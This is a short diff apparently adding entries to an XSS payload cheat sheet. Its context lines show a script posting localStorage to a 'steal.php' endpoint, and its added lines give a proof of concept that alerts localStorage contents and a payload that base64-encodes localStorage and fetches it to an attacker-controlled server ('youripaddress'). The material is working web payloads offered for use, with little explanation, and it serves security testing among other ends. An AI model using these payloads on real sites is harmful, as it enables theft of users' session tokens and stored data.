@@ -17,3 +17,9 @@
   }
   img.src="http://oursite.com?steal.php?c=" + stor;
 </script>
+
+#4 Simple PoC to alert content of the localStorage:
+<script>alert(JSON.stringify(localStorage))</script>
+
+#5 Send base64 encoded content of the localStorage to your web server (e.g. python http) and decode it afterwards. Payload:
+<script>fetch(`http://youripaddress/${btoa(JSON.stringify(localStorage))}`)</script>
